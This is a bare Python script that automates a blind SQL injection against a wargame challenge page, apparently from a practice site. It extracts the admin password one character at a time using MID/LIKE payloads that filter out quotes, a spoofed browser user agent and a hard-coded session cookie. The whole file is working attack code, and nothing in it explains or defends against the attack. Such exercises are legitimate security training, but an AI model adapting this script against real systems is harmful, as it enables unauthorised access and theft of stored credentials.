import urllib.request
from urllib.parse import quote

key = ""
for i in range(1, 9):
    for j in range(48, 127):
        url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="
        data = '1 or id like "admin" and mid(pw,1,{}) like "{}"#'.format(str(i), key + chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36") 
        re.add_header("Cookie", "PHPSESSID=6ckrsnfovcd74972o80ugmksb4")
        res = urllib.request.urlopen(re) 
        if str(res.read()).find("Hello admin") != -1:
            key += chr(j).lower()
            print(key)
            break
print(key)